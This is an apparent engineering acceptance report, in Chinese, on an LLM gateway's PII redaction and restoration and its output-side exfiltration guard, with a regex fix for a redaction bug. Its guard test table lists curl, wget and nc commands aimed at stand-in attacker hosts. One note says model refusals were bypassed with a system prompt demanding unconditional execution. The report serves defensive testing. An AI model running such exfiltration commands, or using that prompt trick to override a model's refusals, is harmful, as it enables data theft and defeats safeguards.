# r1036 — 154 生产脱敏/恢复多轮验收 + 「标签+号+数字」被地址规则整段吞掉（2026-10-20）

## 结论

- **脱敏与恢复链路在 154 上正常**：输入侧替换为 `{SENSITIVE:type:n}` 占位符，响应侧还原回原值，客户端拿到的既是占位符形态的上游内容、又是还原后的原文。
- **输出侧防外传守卫正常工作**：公网 IP / 域名 / wget / nc 四类外传目的地全部 403 `output_policy_blocked`；本地回环 `127.0.0.1` 正常放行。
- **发现并修复一个真实缺陷**（r1036）：地址规则把「标签 + 号 + 数字」整段吞成单个 `custom` 占位符，导致类型退化。修复在 `security/sanitize/detector.go`。

## 验收环境

| 项 | 值 |
|---|---|
| 被测网关 | 154（`llm.kxpms.cn` → 47.97.111.154 → nginx → `llm_local` → 127.0.0.1:8782） |
| 网关版本 | `2744-99aca741`（`/opt/llm-gateway-go/current`） |
| 数据库 | `172.16.2.210:5432/llm_gateway`（与 245 共享） |
| Redis | `172.16.2.210:6389`，会话与脱敏映射在 **db2** |
| 输出脱敏总开关 | `sanitize.output_check_enabled` = `true`（来源 `db`，经管理端 API 读回） |
| 请求日志写侧 | `storage.request_logs_write_enabled` = `false`（S4 停写门控，**非缺陷**） |
| 客户端凭据 | 用户提供的 3 个 key 中 **key1 已失效**（401 `invalid_key`），key2 / key3 有效 |

> 凭据只在本次验收使用，未落仓库、未写入任何文档。

## 验收方法

三路证据交叉，缺一不可：

1. **Redis 脱敏映射表**（`session:<tenantHash>:<sessionId>:sanitize`）——证明输入侧确实产生了占位符。
2. **上游 raw 审计落盘**（`/var/log/llm-gateway-go/raw_data/*.jsonl`，base64 `raw_data`）——`direction=upstream_request` 是**上游实收内容**，`direction=upstream_response` 是**上游实回内容**。这是唯一能区分「网关脱敏了」与「模型自己编的」的证据。
3. **客户端可见响应**——证明还原后调用方拿到的是原值。

只看客户端响应会得出完全相反的结论（模型回复里出现明文，看起来像泄漏），这正是 r1014 那条「允许侧假绿」的镜像形态。

## 一、脱敏与恢复链路（正常）

### 输入侧

```
IN : 我的手机号是 13800138000，邮箱 zhangsan@example.com
UPSTREAM REQUEST : {"content":"我的手机号是 {SENSITIVE:phone:1}，邮箱 {SENSITIVE:email:1}"}
```

Redis 映射表（`hgetall session:37a8eec1ce19687d:<sid>:sanitize`）：

```
{SENSITIVE:phone:1}  13800138000
{SENSITIVE:email:1}  zhangsan@example.com
```

### 响应侧（还原）

kimi-k3 的上游实回内容是占位符：

```
UPSTREAM RESPONSE content: 我这里只看到已脱敏的占位符：手机号 {SENSITIVE:phone:1}，邮箱 {SENSITIVE:email:1}；无法访问或复述真实值。
```

客户端收到的是**还原后**的原文：

```
我这里只看到已脱敏的占位符：手机号 13800138000，邮箱 zhangsan@example.com；…
```

⇒ 占位符没有泄漏到客户端，值也没有丢失。还原链忠实。

### 多模型覆盖（上游实收全部为占位符）

| 模型 | 上游实收 | 上游实回 | 客户端 |
|---|---|---|---|
| minimax-m3 | 占位符 | 占位符 | 还原后原文 |
| glm-5.2 | 占位符 | 占位符 | 还原后原文 |
| kimi-k3 | 占位符 | 占位符 | 还原后原文 |
| deepseek-v4-flash | 占位符 | 占位符 | 还原后原文 |

**终验复核**（推送前最后一遍，四个 session 逐一核对 raw 落盘）：

```
gw_final_4190b7b8: REQ_plain=[] REQ_ph=True | RESP_plain=[] RESP_ph=False
gw_final_1015be27: REQ_plain=[] REQ_ph=True | RESP_plain=[] RESP_ph=True
gw_final_49f74b85: REQ_plain=[] REQ_ph=True | RESP_plain=[] RESP_ph=True
gw_final_feeeda41: REQ_plain=[] REQ_ph=True | RESP_plain=[] RESP_ph=True
```

⇒ 四个模型的上游实收**全部**是占位符，无明文出网关。

### 多轮累积

同一 session 连发三轮，映射表编号递增不撞号：

```
{SENSITIVE:custom:1} → 第1轮：手机号 13800138001
{SENSITIVE:custom:2} → 第2轮：手机号 13800138002
{SENSITIVE:custom:3} → 第3轮：手机号 13800138003
```

（编号正确；但**类型是 custom 而非 phone** —— 这就是 r1036 缺陷，见下。）

### 流式路径

- 脱敏+还原：客户端文本 `contains_placeholder=False`、`plaintext_present=[]`，无占位符残留。
- 外传守卫：流式 SSE 内返回 `data: {"error":{"code":"output_policy_blocked"}}`，正确阻断。

## 二、输出侧防外传守卫（正常）

守卫只在**模型生成的 tool 参数**上判定。用户输入里的外传目的地按设计放行。

| 场景 | 结果 |
|---|---|
| `curl http://203.0.113.8/collect` | 403 `output_policy_blocked` |
| `curl https://collect.evil.example.com/d` | 403 `output_policy_blocked` |
| `wget http://203.0.113.5/x.sh -O /tmp/x` | 403 `output_policy_blocked` |
| `nc attacker.io 4444` | 403 `output_policy_blocked` |
| `curl http://127.0.0.1:8080/x` | 200，正常放行 |

日志留痕（154 canary）：

```json
{"msg":"output_compliance: blocked stream lane","lane":"chat.choice.0.delta.tool.0.arguments",
 "label":"__tool_json@bash","issues":1,"reason_codes":["secret"]}
{"msg":"safety_net_defer_fired","attempt_err_code":"output_policy_blocked","attempt_logged":true}
```

> 踩坑：模型**自己**会拒绝恶意命令，此时 `finish_reason=length` 且无 tool_calls，守卫根本没被触发。必须用「system 提示要求无条件执行」的构造才能真正压到守卫，否则会误判成「守卫没工作」。

## 三、r1036 缺陷：「标签 + 号 + 数字」被地址规则整段吞掉

### 现象

154 生产上「手机号 13800138001」送上游时变成**单个** `{SENSITIVE:custom:1}`，而不是「手机号 {SENSITIVE:phone:1}」。

### 根因

`configs/sensitive_patterns.yaml` 的 address 规则：

```
[^\s]{2,}[省市区县镇乡村路街道巷弄号栋单元室]\s*[\d\-号栋单元室]+
```

字符类里的「号」既表示门牌号，也命中「手机号 / 房间号 / 工单号 / 订单号」这类**标签词的尾字**：

```
[^\s]{2,}  → "手机"
[...号...] → "号"
\s*       → " "
[\d...]+  → "13800138001"
```

同一次检测里 phone 规则确实也命中了「13800138001」（10:21），但被 address 的 custom 片段（0:21）**包裹**。`mergeFragmentSpans` 按起点排序、起点相同时取跨度更大者 → 外层 custom 赢，整句塌成一个占位符。

### 危害

不是泄漏（值照样被遮住），是**类型退化**：

1. 占位符类型从 `phone` 退成 `custom`，下游按类型分流的地方拿不到类型信息。
2. 还原面扩大：占位符还原回的是**整句**「手机号 13800138001」，映射的语义不再是「一个手机号」。
3. 判据可在本地用真实规则文件复现，无需 154 在线。

### 修复

`security/sanitize/detector.go` 新增 `dropLabelWrappedAddressFragments`：一个 custom 片段若**完全包住**另一个更精确类型的片段，则它不是地址而是「标签 + 精确值」，丢弃该 custom 片段，让精确类型胜出。

- 「手机号 13800138001」：custom(0:21) ⊃ phone(10:21) ⇒ 丢弃 custom ⇒ `手机号 {SENSITIVE:phone:1}`
- 「北京市朝阳区建国路88号」：只有 custom，无精确子片段 ⇒ **保持原样**，仍整段脱敏

**为什么不在正则里删掉「号」**：真实地址大量以「号」结尾（「建国路88号」「文三路100号」），删掉会让地址规则整体失效——那是倒退不是修复。

### 判据

`security/sanitize/r1036_label_suffix_address_test.go`，五条：

| 判据 | 作用 |
|---|---|
| `TestR1036LabelSuffixIsNotAddress` | 6 个子例：标签+号+phone/credit_card/email/id_card |
| `TestR1036RealAddressStillRedacted` | 正负对照：真地址仍须脱敏 |
| `TestR1036NonAddressLabelWithoutPreciseTypeUnchanged` | 修复边界：无精确子片段的标签形态行为不变 |
| `TestR1036AddressNextToPreciseValueNotOverDropped` | 精确值与真地址**相接**时，地址片段不能被连带丢弃 |
| `TestR1036PartialOverlapKeepsPreciseValue` | 片段**同起点不同终点**（custom 4:21 ⊃ phone 4:15）时精确值仍胜出 |

判据用 `NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")`——**必须**用真实规则文件。内置 fallback 的 `defaultPatternEntries` 里没有任何地址规则，用它写的地址类判据会恒绿（r1010 教训，本轮再次命中）。

### 变异验证

| 变异 | 判据反应 |
|---|---|
| 撤掉 `dropLabelWrappedAddressFragments` 调用 | ✅ `TestR1036LabelSuffixIsNotAddress` 3 个子例红 + `TestR1036PartialOverlapKeepsPreciseValue` 红（实得 `{SENSITIVE:custom:1}`，期望 `phone`） |
| 把「完全包住」放宽成「有重叠」 | ⚠️ **全绿** —— 见下方「变异验证的诚实记录」 |

#### 变异验证的诚实记录

第二条变异（「完全包住」→「有重叠」）**没有被现有语料抓到**。查证过程：

- 逐一构造候选样本并观测片段区间，结论是：地址规则的前缀 `[^\s]{2,}` 至少吃 2 个字符，因此 custom(address) 片段**永远比** phone 片段长或等长，**从不存在**「custom ⊂ phone」或「部分重叠且非包含」的可达形态。
- 唯一能构造出的非包含形态是「同起点不同终点」（custom 4:21 / phone 4:15），此时两种实现**结果相同**（都丢弃 custom）。
- 还原保真度探针（`RestoreOutput` 往返）也一致：两版都 `ROUNDTRIP_OK=true`。

⇒ 结论：**「完全包住」与「有重叠」在当前规则语义下不可区分**。这不是判据的漏洞，而是**实现可以更简单**的信号。

保留「完全包住」写法（而非改成「有重叠」）的理由：

1. 语义更准确——剔除的判据是「custom **完全包住**精确片段 ⇒ 它是标签+值的外壳」，这正是缺陷的成因结构。
2. 「有重叠」会误伤将来可能出现的「custom ⊂ phone」形态（那时 custom 是精确值的一部分，丢弃它是错的）。当前不可达，但规则文件可被运营改写，不应依赖「当前恰好不可达」。
3. 代价为零——两种写法当前行为一致。

**这条记录本身是判据纪律的一部分**：变异没被抓住时，不能写成「变异验证通过」，只能写成「该变异在本语料下不可区分」并给出理由（r1015「判据红了先怀疑自己的前提」的镜像：判据**绿**了也要问「它在钉什么」）。

## 四、回归与既有 flaky

| 包 | 结果 |
|---|---|
| `go build ./...` | 通过 |
| `go vet ./security/sanitize/` | 通过 |
| `./security/sanitize/` | ok（19.6s / 12.0s 两次） |
| `./domains/outputcompliance/` | ok |
| `./internal/credentialtext/` | ok |
| `./domains/hooks/outputcompliance/` | ok |
| `./cmd/gateway/` | ok |
| `./domains/streaming/` | 复跑 ok（157.8s）—— 首次那条 FAIL 是 flaky，见下 |

### `TestConnectionMonitorTouchPreventsProbe` 是既有 flaky，与本轮改动无关

首次全包跑时 `domains/streaming` 有一条 FAIL：

```
--- FAIL: TestConnectionMonitorTouchPreventsProbe (0.12s)
    connection_monitor_test.go:56: probe ran while monitor was active: 1
```

**强证明（pristine worktree）**：在 `git worktree add` 出来的 pristine HEAD（`4be620d7d`，无本轮任何改动）上复跑 `-count=20`，**同样复现**同一条 FAIL。

⇒ 该用例与本轮改动**无因果关系**。它是时序敏感的既有用例：monitor 轮询间隔 1ms、idle 超时 20ms，用例里 `Touch()` 循环 10 次、每次间隔 2ms——在机器负载高时（当时有多个并发会话在跑 `go test ./...`）20ms idle 窗口可能在两次 `Touch()` 之间到期，探针于是触发。

**佐证**：在本轮分支上复跑 `./domains/streaming/` 全包 → **ok（157.8s）**，该用例通过。

**为什么不能把它写成「与本轮无关」了事**：判据纪律第 4 条要求区分「强」与「弱」两种证明。这里用的是**强**证明（pristine worktree 复现），不是「目标包不依赖被改包」的弱证明。

**本轮遗留**：该 flaky 未修（超出本轮范围——它属于连接监控的时序设计，不属于脱敏）。建议单独一轮处理：把 idle 超时与 `Touch()` 间隔的关系改成不依赖墙钟精度的判据。

## 五、附带查清的环境事实

### gpt-6-luna 在 154 上无可用候选（不是脱敏问题）

用户点名要测 gpt-6-luna。生产上它 503 `no_candidate`。根因链：

```
model_offers: gpt-6-luna → credential_id 3 → provider 2454 (api.vapeur.ai)
credentials[3].quota_state = 'permanently_exhausted'
v_routable_credential_models: gpt-6-luna → is_routable=false, reason=quota_permanently_exhausted
候选 SQL 的硬排除: AND v.is_routable = TRUE
⇒ candidates_count=0
```

日志佐证：`[candidate_diag] db_empty model=gpt-6-luna plan_count=0 candidate_count=0`。

凭据 3 的 148 个模型**全部** `quota_permanently_exhausted`。凭据 2（nvidia）健康，`minimax-m3` 走它。

**这是配额枯竭，不是脱敏缺陷**，也不因本轮改动而变化。恢复它需要给凭据 3 续配额（或换凭据），属配置/采购动作，不在本轮代码范围。

### 用户点名的模型 → 154 实际可用性对照

| 用户点名的模型 | 154 实测 | 归因 |
|---|---|---|
| `minimax-m3` | ✅ 200 | 凭据 2（nvidia 健康） |
| `glm-5.3` | ❌ 503 `model_not_found`（transient，「All 3 candidates failed」） | 凭据 3 配额枯竭 |
| `deepseek-v4-pro` | ❌ 503 `no_candidate` | 凭据 3 配额枯竭 |
| `mimo-v2.5-pro` | ❌ 503 `no_candidate` | 凭据 3 配额枯竭 |
| `gpt-6-luna` | ❌ 503 `no_candidate` | 凭据 3 配额枯竭 |

⇒ 用户点名的 5 个模型里只有 `minimax-m3` 可用。为覆盖「多个模型」这一要求，
本轮改用 154 上**实际可路由**的模型做全链路验收：
**minimax-m3 / glm-5.2 / kimi-k3 / deepseek-v4-flash**（走凭据 1 sensenova 与
凭据 2 nvidia 两条健康上游）。

这四个模型的上游实收内容**全部**是占位符（终验复核，四个 session 逐一核对），
脱敏与恢复行为一致。

**顺带一提**：用户提供的 kaixuan 端点 `https://llm.kxpms.cn/v1` 本身就是 154
的公网入口（DNS → 47.97.111.154，nginx `server_name llm.kxpms.cn` → `llm_local`
→ 127.0.0.1:8782），所以「用 kaixuan 凭据调网关」与「向 154 发请求」是同一条
路径，不是两套东西。

### 用户提供的 3 个 key：key1 已失效

| key | 状态 |
|---|---|
| `sk-1vH6C2I9…` | ❌ 401 `invalid_key`（已失效/未签发到该网关） |
| `sk-RZ8dm0zyw…` | ✅ 有效 |
| `sk-jybFTc1Jl…` | ✅ 有效 |

key2 / key3 均不在 154 的 `api_keys` 表与 keystore 快照里
（`key_hash` = sha256(key)，三者的 sha256 都查不到），但网关确实认它们——
说明认证路径上还有本轮未查清的旁路（keystore 与 PG 表的行也对不上：
keystore 有 id 196/195/198，PG `api_keys` 的 max(id) 只有 9）。
**这不影响本轮验收**（两条路都能跑通），但它是独立的一条待查项。

### 内网 IP 不脱敏是既定设计

`192.168.31.40` 在上游实收里是**明文**。这不是漏检：`server_ip` / `internal_ip` 在 2026-10-10（`ce5e35ab3`）已被移出 `ScopeRedact`，只供 `ScopeEgress` 防外传守卫使用。理由写在 `configs/sensitive_patterns.yaml:56-74`：地址类文本是运维上下文不是机密，脱敏只会把可复制的命令变成坏命令，收益为零。

### `_request_logs_hot` 的 0 行是门控停写的正常后果

`settings_kv.storage.request_logs_write_enabled = false`（S4 停写）。§129 P0-h 已坐实：请求日志侧的 hot 表停在 2026-10-14 04:33，**0 行不是缺陷**。因此本轮记录核查走 raw 落盘 + Redis 映射表 + 会话族，而非 `_request_logs`。

### `input_sensitive` 字段与网关脱敏无关

MiniMax 上游响应自带 `input_sensitive` / `output_sensitive` 字段（`domains/streaming/strip_minimax_fields.go` 有专门处理）。它**不**表示网关的脱敏状态。r1014 那条「允许侧假绿」在此有对应形态：拿它当脱敏判据会得出「没脱敏」的假结论。

## 六、遗留与建议

| 项 | 状态 | 建议 |
|---|---|---|
| gpt-6-luna 无候选 | 凭据 3 配额枯竭 | 续配额或换凭据；**与脱敏无关** |
| 用户提供的 key1 | 401 已失效 | 需重新签发；key2/key3 正常 |
| `_request_logs_hot` | 门控停写 | 属设计，等 S4 恢复 |
| 本轮修复**未部署** | 仅本地代码 | 需构建 + 部署 154 后复测生产形态 |

## 七、证据清单

| 证据 | 位置 |
|---|---|
| Redis 脱敏映射 | `session:37a8eec1ce19687d:<sid>:sanitize`（Redis db2） |
| 上游实收/实回 | `/var/log/llm-gateway-go/raw_data/*.jsonl`（`direction=upstream_request/response`，base64） |
| 网关运行日志 | `/opt/llm-gateway-go/logs/gateway-canary-8782.log` |
| nginx 访问日志 | `/var/log/nginx/llm-kxpms-cn-access.log` |
| 路由候选诊断 | canary 日志 `[candidate_diag] db_empty` |
| 守卫拦截留痕 | canary 日志 `output_compliance: blocked stream lane` / `safety_net_defer_fired` |
| 本地复现 | `security/sanitize/r1036_label_suffix_address_test.go` |
| 改动 | `security/sanitize/detector.go`（`dropLabelWrappedAddressFragments`） |

原始请求正文与凭据不落仓库。
